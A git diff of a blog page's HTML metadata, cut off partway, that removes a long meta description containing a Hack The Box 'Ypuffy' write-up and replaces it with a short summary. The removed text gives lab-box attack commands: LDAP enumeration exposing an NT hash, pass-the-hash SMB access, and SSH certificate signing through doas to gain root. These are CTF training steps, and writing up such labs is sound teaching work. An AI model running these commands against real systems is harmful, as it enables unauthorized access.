@@ -3,24 +3,25 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>Hack The Box - Ypuffy | 0xRick Owned Root !</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<title>Hack The Box - Ypuffy | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
 <meta property="og:title" content="Hack The Box - Ypuffy" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Quick Summary Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in /etc/hosts as ypuffy.htb Nmap As always we will start with nmap so : nmap -sV -sT -sC ypuffy.htb Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389 It also tells us that we can connect anonymously to ldap. Initial Enumeration Let’s check http first Connection reset. http will be useful later but not now. Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use smbmap smbmap -H ypuffy.htb Access Denied. Let’s check ldap LDAP nmap told us that anonymous authentication was allowed so we will use a tool called ldapsearch ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb Full Output : # extended LDIF # # LDAPv3 # base &lt;dc=hackthebox,dc=htb&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # hackthebox.htb dn: dc=hackthebox,dc=htb dc: hackthebox objectClass: top objectClass: domain # passwd, hackthebox.htb dn: ou=passwd,dc=hackthebox,dc=htb ou: passwd objectClass: top objectClass: organizationalUnit # bob8791, passwd, hackthebox.htb dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb uid: bob8791 cn: Bob objectClass: account objectClass: posixAccount objectClass: top userPassword:: e0JTREFVVEh9Ym9iODc5MQ== uidNumber: 5001 gidNumber: 5001 gecos: Bob homeDirectory: /home/bob8791 loginShell: /bin/ksh # alice1978, passwd, hackthebox.htb dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb uid: alice1978 cn: Alice objectClass: account objectClass: posixAccount objectClass: top objectClass: sambaSamAccount userPassword:: e0JTREFVVEh9YWxpY2UxOTc4 uidNumber: 5000 gidNumber: 5000 gecos: Alice homeDirectory: /home/alice1978 loginShell: /bin/ksh sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 displayName: Alice sambaAcctFlags: [U ] sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B sambaPwdLastSet: 1532916644 # group, hackthebox.htb dn: ou=group,dc=hackthebox,dc=htb ou: group objectClass: top objectClass: organizationalUnit # bob8791, group, hackthebox.htb dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: bob8791 userPassword:: e2NyeXB0fSo= gidNumber: 5001 # alice1978, group, hackthebox.htb dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: alice1978 userPassword:: e2NyeXB0fSo= gidNumber: 5000 # ypuffy, hackthebox.htb dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb sambaDomainName: YPUFFY sambaSID: S-1-5-21-3933741069-3307154301-3557023464 sambaAlgorithmicRidBase: 1000 objectclass: sambaDomain sambaNextUserRid: 1000 sambaMinPwdLength: 5 sambaPwdHistoryLength: 0 sambaLogonToChgPwd: 0 sambaMaxPwdAge: -1 sambaMinPwdAge: 0 sambaLockoutDuration: 30 sambaLockoutObservationWindow: 30 sambaLockoutThreshold: 0 sambaForceLogoff: -1 sambaRefuseMachinePwdChange: 0 sambaNextRid: 1001 # search result search: 2 result: 0 Success # numResponses: 9 # numEntries: 8 we can also use nmap to enumerate ldap , with a script called ldap-search nmap -p 389 --script ldap-search ypuffy.htb Full Output: Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET Nmap scan report for ypuffy.htb (10.10.10.107) Host is up (0.14s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: dc=hackthebox,dc=htb | dn: dc=hackthebox,dc=htb | dc: hackthebox | objectClass: top | objectClass: domain | dn: ou=passwd,dc=hackthebox,dc=htb | ou: passwd | objectClass: top | objectClass: organizationalUnit | dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb | uid: bob8791 | cn: Bob | objectClass: account | objectClass: posixAccount | objectClass: top | userPassword: {BSDAUTH}bob8791 | uidNumber: 5001 | gidNumber: 5001 | gecos: Bob | homeDirectory: /home/bob8791 | loginShell: /bin/ksh | dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb | uid: alice1978 | cn: Alice | objectClass: account | objectClass: posixAccount | objectClass: top | objectClass: sambaSamAccount | userPassword: {BSDAUTH}alice1978 | uidNumber: 5000 | gidNumber: 5000 | gecos: Alice | homeDirectory: /home/alice1978 | loginShell: /bin/ksh | sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 | displayName: Alice | sambaAcctFlags: [U ] | sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 | sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B | sambaPwdLastSet: 1532916644 | dn: ou=group,dc=hackthebox,dc=htb | ou: group | objectClass: top | objectClass: organizationalUnit | dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: bob8791 | userPassword: {crypt}* | gidNumber: 5001 | dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: alice1978 | userPassword: {crypt}* | gidNumber: 5000 | dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb | sambaDomainName: YPUFFY | sambaSID: S-1-5-21-3933741069-3307154301-3557023464 | sambaAlgorithmicRidBase: 1000 | objectclass: sambaDomain | sambaNextUserRid: 1000 | sambaMinPwdLength: 5 | sambaPwdHistoryLength: 0 | sambaLogonToChgPwd: 0 | sambaMaxPwdAge: -1 | sambaMinPwdAge: 0 | sambaLockoutDuration: 30 | sambaLockoutObservationWindow: 30 | sambaLockoutThreshold: 0 | sambaForceLogoff: -1 | sambaRefuseMachinePwdChange: 0 |_ sambaNextRid: 1001 Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds The most interesting part is this : We get a username alice1978 and an smb NT hash 0B186E661BBDBDCF6047784DE8B9FD8B This hash is uncrackable however we can still use it to authenticate. SMB Enumeration We need to list the shares first to know where we can connect. We can use a tool called crackmapexec : crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares There are only two shares alice and IPC$ , we have read and write permissions to alice and no access to IPC$ We can also use smbclient to list the shares : smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/ But it doesn’t tell us which shares do we have access to and which we don’t. So we know that we can access the share alice , let’s connect. smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice There’s only one file called my_private_key.ppk , get my_private_key.ppk to download it. SSH and getting user my_private_key.ppk is a putty private key , we need to convert that to an ssh private key to be able to ssh with it. On kali I had to get putty-tools first apt-get install putty-tools Then we will use puttygen : puttygen my_private_key.ppk -O private-openssh -o alice.key Now let’s take a look at the key : Last step is to chmod 600 alice.key and finally ssh ssh -i alice.key alice1978@ypuffy.htb And we owned user ! More Enumeration Remember http ? we got a connection reset. Let’s check /etc/httpd.conf We see two interesting things , location &quot;/userca*&quot; and location &quot;/sshauth*&quot; After some more enumeration , there are 3 users on the box alice1978 , bob8791 and userca bob8791 has a directory called dba Inside it there’s an sql file called sshauth.sql It creates a table called principals and another table called keys If we also check sshd_config in /etc/ssh/ # $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #LoginGraceTime 2m PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes # The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 # but this is overridden so installations will only check .ssh/authorized_keys AuthorizedKeysFile .ssh/authorized_keys #AuthorizedPrincipalsFile none AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u AuthorizedKeysCommandUser nobody TrustedUserCAKeys /home/userca/ca.pub AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u AuthorizedPrincipalsCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don&#39;t trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don&#39;t read the user&#39;s ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! PasswordAuthentication no #PermitEmptyPasswords no # Change to no to disable s/key passwords ChallengeResponseAuthentication no AllowAgentForwarding no AllowTcpForwarding no #GatewayPorts no X11Forwarding no #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # override default of no subsystems Subsystem sftp /usr/libexec/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server This part : So that http service is responsible for some ssh authentication stuff , and we can request keys from /sshauth?type=keys&amp;username= and principals from /sshauth?type=principals&amp;username= , requesting keys for root gives us no response , but requesting the principal we get 3m3rgencyB4ckd00r Generating and signing ssh keys , Getting root So now we have root’s principal 3m3rgencyB4ckd00r. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them. The problem is , as alice1978 we are not authorized to do this. On linux we could check if we can run elevated commands with sudo -l but here there’s no sudo , instead of that there’s a command called doas , if we check the config file for it : We can run ssh-keygen as userca without password. First step is to create ssh keys for alice1978 ssh-keygen -t rsa -f /tmp/id_rsa Then we need the certificate (ca) in /home/userca/ so we will cd there And sign the ssh keys we have just created as root doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub -s for certificate , -I for identity and -n for principal Finally we will ssh as root : ssh -i /tmp/id_rsa root@localhost And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Dab Next Hack The Box write-up : Hack The Box - Giddy" />
-<meta property="og:description" content="Quick Summary Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in /etc/hosts as ypuffy.htb Nmap As always we will start with nmap so : nmap -sV -sT -sC ypuffy.htb Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389 It also tells us that we can connect anonymously to ldap. Initial Enumeration Let’s check http first Connection reset. http will be useful later but not now. Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use smbmap smbmap -H ypuffy.htb Access Denied. Let’s check ldap LDAP nmap told us that anonymous authentication was allowed so we will use a tool called ldapsearch ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb Full Output : # extended LDIF # # LDAPv3 # base &lt;dc=hackthebox,dc=htb&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # hackthebox.htb dn: dc=hackthebox,dc=htb dc: hackthebox objectClass: top objectClass: domain # passwd, hackthebox.htb dn: ou=passwd,dc=hackthebox,dc=htb ou: passwd objectClass: top objectClass: organizationalUnit # bob8791, passwd, hackthebox.htb dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb uid: bob8791 cn: Bob objectClass: account objectClass: posixAccount objectClass: top userPassword:: e0JTREFVVEh9Ym9iODc5MQ== uidNumber: 5001 gidNumber: 5001 gecos: Bob homeDirectory: /home/bob8791 loginShell: /bin/ksh # alice1978, passwd, hackthebox.htb dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb uid: alice1978 cn: Alice objectClass: account objectClass: posixAccount objectClass: top objectClass: sambaSamAccount userPassword:: e0JTREFVVEh9YWxpY2UxOTc4 uidNumber: 5000 gidNumber: 5000 gecos: Alice homeDirectory: /home/alice1978 loginShell: /bin/ksh sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 displayName: Alice sambaAcctFlags: [U ] sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B sambaPwdLastSet: 1532916644 # group, hackthebox.htb dn: ou=group,dc=hackthebox,dc=htb ou: group objectClass: top objectClass: organizationalUnit # bob8791, group, hackthebox.htb dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: bob8791 userPassword:: e2NyeXB0fSo= gidNumber: 5001 # alice1978, group, hackthebox.htb dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: alice1978 userPassword:: e2NyeXB0fSo= gidNumber: 5000 # ypuffy, hackthebox.htb dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb sambaDomainName: YPUFFY sambaSID: S-1-5-21-3933741069-3307154301-3557023464 sambaAlgorithmicRidBase: 1000 objectclass: sambaDomain sambaNextUserRid: 1000 sambaMinPwdLength: 5 sambaPwdHistoryLength: 0 sambaLogonToChgPwd: 0 sambaMaxPwdAge: -1 sambaMinPwdAge: 0 sambaLockoutDuration: 30 sambaLockoutObservationWindow: 30 sambaLockoutThreshold: 0 sambaForceLogoff: -1 sambaRefuseMachinePwdChange: 0 sambaNextRid: 1001 # search result search: 2 result: 0 Success # numResponses: 9 # numEntries: 8 we can also use nmap to enumerate ldap , with a script called ldap-search nmap -p 389 --script ldap-search ypuffy.htb Full Output: Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET Nmap scan report for ypuffy.htb (10.10.10.107) Host is up (0.14s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: dc=hackthebox,dc=htb | dn: dc=hackthebox,dc=htb | dc: hackthebox | objectClass: top | objectClass: domain | dn: ou=passwd,dc=hackthebox,dc=htb | ou: passwd | objectClass: top | objectClass: organizationalUnit | dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb | uid: bob8791 | cn: Bob | objectClass: account | objectClass: posixAccount | objectClass: top | userPassword: {BSDAUTH}bob8791 | uidNumber: 5001 | gidNumber: 5001 | gecos: Bob | homeDirectory: /home/bob8791 | loginShell: /bin/ksh | dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb | uid: alice1978 | cn: Alice | objectClass: account | objectClass: posixAccount | objectClass: top | objectClass: sambaSamAccount | userPassword: {BSDAUTH}alice1978 | uidNumber: 5000 | gidNumber: 5000 | gecos: Alice | homeDirectory: /home/alice1978 | loginShell: /bin/ksh | sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 | displayName: Alice | sambaAcctFlags: [U ] | sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 | sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B | sambaPwdLastSet: 1532916644 | dn: ou=group,dc=hackthebox,dc=htb | ou: group | objectClass: top | objectClass: organizationalUnit | dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: bob8791 | userPassword: {crypt}* | gidNumber: 5001 | dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: alice1978 | userPassword: {crypt}* | gidNumber: 5000 | dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb | sambaDomainName: YPUFFY | sambaSID: S-1-5-21-3933741069-3307154301-3557023464 | sambaAlgorithmicRidBase: 1000 | objectclass: sambaDomain | sambaNextUserRid: 1000 | sambaMinPwdLength: 5 | sambaPwdHistoryLength: 0 | sambaLogonToChgPwd: 0 | sambaMaxPwdAge: -1 | sambaMinPwdAge: 0 | sambaLockoutDuration: 30 | sambaLockoutObservationWindow: 30 | sambaLockoutThreshold: 0 | sambaForceLogoff: -1 | sambaRefuseMachinePwdChange: 0 |_ sambaNextRid: 1001 Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds The most interesting part is this : We get a username alice1978 and an smb NT hash 0B186E661BBDBDCF6047784DE8B9FD8B This hash is uncrackable however we can still use it to authenticate. SMB Enumeration We need to list the shares first to know where we can connect. We can use a tool called crackmapexec : crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares There are only two shares alice and IPC$ , we have read and write permissions to alice and no access to IPC$ We can also use smbclient to list the shares : smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/ But it doesn’t tell us which shares do we have access to and which we don’t. So we know that we can access the share alice , let’s connect. smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice There’s only one file called my_private_key.ppk , get my_private_key.ppk to download it. SSH and getting user my_private_key.ppk is a putty private key , we need to convert that to an ssh private key to be able to ssh with it. On kali I had to get putty-tools first apt-get install putty-tools Then we will use puttygen : puttygen my_private_key.ppk -O private-openssh -o alice.key Now let’s take a look at the key : Last step is to chmod 600 alice.key and finally ssh ssh -i alice.key alice1978@ypuffy.htb And we owned user ! More Enumeration Remember http ? we got a connection reset. Let’s check /etc/httpd.conf We see two interesting things , location &quot;/userca*&quot; and location &quot;/sshauth*&quot; After some more enumeration , there are 3 users on the box alice1978 , bob8791 and userca bob8791 has a directory called dba Inside it there’s an sql file called sshauth.sql It creates a table called principals and another table called keys If we also check sshd_config in /etc/ssh/ # $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #LoginGraceTime 2m PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes # The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 # but this is overridden so installations will only check .ssh/authorized_keys AuthorizedKeysFile .ssh/authorized_keys #AuthorizedPrincipalsFile none AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u AuthorizedKeysCommandUser nobody TrustedUserCAKeys /home/userca/ca.pub AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u AuthorizedPrincipalsCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don&#39;t trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don&#39;t read the user&#39;s ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! PasswordAuthentication no #PermitEmptyPasswords no # Change to no to disable s/key passwords ChallengeResponseAuthentication no AllowAgentForwarding no AllowTcpForwarding no #GatewayPorts no X11Forwarding no #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # override default of no subsystems Subsystem sftp /usr/libexec/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server This part : So that http service is responsible for some ssh authentication stuff , and we can request keys from /sshauth?type=keys&amp;username= and principals from /sshauth?type=principals&amp;username= , requesting keys for root gives us no response , but requesting the principal we get 3m3rgencyB4ckd00r Generating and signing ssh keys , Getting root So now we have root’s principal 3m3rgencyB4ckd00r. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them. The problem is , as alice1978 we are not authorized to do this. On linux we could check if we can run elevated commands with sudo -l but here there’s no sudo , instead of that there’s a command called doas , if we check the config file for it : We can run ssh-keygen as userca without password. First step is to create ssh keys for alice1978 ssh-keygen -t rsa -f /tmp/id_rsa Then we need the certificate (ca) in /home/userca/ so we will cd there And sign the ssh keys we have just created as root doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub -s for certificate , -I for identity and -n for principal Finally we will ssh as root : ssh -i /tmp/id_rsa root@localhost And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Dab Next Hack The Box write-up : Hack The Box - Giddy" />
+<meta name="description" content="My write-up for Ypuffy from Hack The Box." />
+<meta property="og:description" content="My write-up for Ypuffy from Hack The Box." />
 <link rel="canonical" href="http://localhost:4000/hack-the-box/ypuffy/" />
 <meta property="og:url" content="http://localhost:4000/hack-the-box/ypuffy/" />
-<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:site_name" content="0xRick" />
 <meta property="og:image" content="http://localhost:4000/hackthebox/ypuffy/0.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-02-09T00:00:00+02:00" />
 <script type="application/ld+json">
-{"description":"Quick Summary Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in /etc/hosts as ypuffy.htb Nmap As always we will start with nmap so : nmap -sV -sT -sC ypuffy.htb Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389 It also tells us that we can connect anonymously to ldap. Initial Enumeration Let’s check http first Connection reset. http will be useful later but not now. Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use smbmap smbmap -H ypuffy.htb Access Denied. Let’s check ldap LDAP nmap told us that anonymous authentication was allowed so we will use a tool called ldapsearch ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb Full Output : # extended LDIF # # LDAPv3 # base &lt;dc=hackthebox,dc=htb&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # hackthebox.htb dn: dc=hackthebox,dc=htb dc: hackthebox objectClass: top objectClass: domain # passwd, hackthebox.htb dn: ou=passwd,dc=hackthebox,dc=htb ou: passwd objectClass: top objectClass: organizationalUnit # bob8791, passwd, hackthebox.htb dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb uid: bob8791 cn: Bob objectClass: account objectClass: posixAccount objectClass: top userPassword:: e0JTREFVVEh9Ym9iODc5MQ== uidNumber: 5001 gidNumber: 5001 gecos: Bob homeDirectory: /home/bob8791 loginShell: /bin/ksh # alice1978, passwd, hackthebox.htb dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb uid: alice1978 cn: Alice objectClass: account objectClass: posixAccount objectClass: top objectClass: sambaSamAccount userPassword:: e0JTREFVVEh9YWxpY2UxOTc4 uidNumber: 5000 gidNumber: 5000 gecos: Alice homeDirectory: /home/alice1978 loginShell: /bin/ksh sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 displayName: Alice sambaAcctFlags: [U ] sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B sambaPwdLastSet: 1532916644 # group, hackthebox.htb dn: ou=group,dc=hackthebox,dc=htb ou: group objectClass: top objectClass: organizationalUnit # bob8791, group, hackthebox.htb dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: bob8791 userPassword:: e2NyeXB0fSo= gidNumber: 5001 # alice1978, group, hackthebox.htb dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: alice1978 userPassword:: e2NyeXB0fSo= gidNumber: 5000 # ypuffy, hackthebox.htb dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb sambaDomainName: YPUFFY sambaSID: S-1-5-21-3933741069-3307154301-3557023464 sambaAlgorithmicRidBase: 1000 objectclass: sambaDomain sambaNextUserRid: 1000 sambaMinPwdLength: 5 sambaPwdHistoryLength: 0 sambaLogonToChgPwd: 0 sambaMaxPwdAge: -1 sambaMinPwdAge: 0 sambaLockoutDuration: 30 sambaLockoutObservationWindow: 30 sambaLockoutThreshold: 0 sambaForceLogoff: -1 sambaRefuseMachinePwdChange: 0 sambaNextRid: 1001 # search result search: 2 result: 0 Success # numResponses: 9 # numEntries: 8 we can also use nmap to enumerate ldap , with a script called ldap-search nmap -p 389 --script ldap-search ypuffy.htb Full Output: Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET Nmap scan report for ypuffy.htb (10.10.10.107) Host is up (0.14s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: dc=hackthebox,dc=htb | dn: dc=hackthebox,dc=htb | dc: hackthebox | objectClass: top | objectClass: domain | dn: ou=passwd,dc=hackthebox,dc=htb | ou: passwd | objectClass: top | objectClass: organizationalUnit | dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb | uid: bob8791 | cn: Bob | objectClass: account | objectClass: posixAccount | objectClass: top | userPassword: {BSDAUTH}bob8791 | uidNumber: 5001 | gidNumber: 5001 | gecos: Bob | homeDirectory: /home/bob8791 | loginShell: /bin/ksh | dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb | uid: alice1978 | cn: Alice | objectClass: account | objectClass: posixAccount | objectClass: top | objectClass: sambaSamAccount | userPassword: {BSDAUTH}alice1978 | uidNumber: 5000 | gidNumber: 5000 | gecos: Alice | homeDirectory: /home/alice1978 | loginShell: /bin/ksh | sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 | displayName: Alice | sambaAcctFlags: [U ] | sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 | sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B | sambaPwdLastSet: 1532916644 | dn: ou=group,dc=hackthebox,dc=htb | ou: group | objectClass: top | objectClass: organizationalUnit | dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: bob8791 | userPassword: {crypt}* | gidNumber: 5001 | dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: alice1978 | userPassword: {crypt}* | gidNumber: 5000 | dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb | sambaDomainName: YPUFFY | sambaSID: S-1-5-21-3933741069-3307154301-3557023464 | sambaAlgorithmicRidBase: 1000 | objectclass: sambaDomain | sambaNextUserRid: 1000 | sambaMinPwdLength: 5 | sambaPwdHistoryLength: 0 | sambaLogonToChgPwd: 0 | sambaMaxPwdAge: -1 | sambaMinPwdAge: 0 | sambaLockoutDuration: 30 | sambaLockoutObservationWindow: 30 | sambaLockoutThreshold: 0 | sambaForceLogoff: -1 | sambaRefuseMachinePwdChange: 0 |_ sambaNextRid: 1001 Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds The most interesting part is this : We get a username alice1978 and an smb NT hash 0B186E661BBDBDCF6047784DE8B9FD8B This hash is uncrackable however we can still use it to authenticate. SMB Enumeration We need to list the shares first to know where we can connect. We can use a tool called crackmapexec : crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares There are only two shares alice and IPC$ , we have read and write permissions to alice and no access to IPC$ We can also use smbclient to list the shares : smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/ But it doesn’t tell us which shares do we have access to and which we don’t. So we know that we can access the share alice , let’s connect. smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice There’s only one file called my_private_key.ppk , get my_private_key.ppk to download it. SSH and getting user my_private_key.ppk is a putty private key , we need to convert that to an ssh private key to be able to ssh with it. On kali I had to get putty-tools first apt-get install putty-tools Then we will use 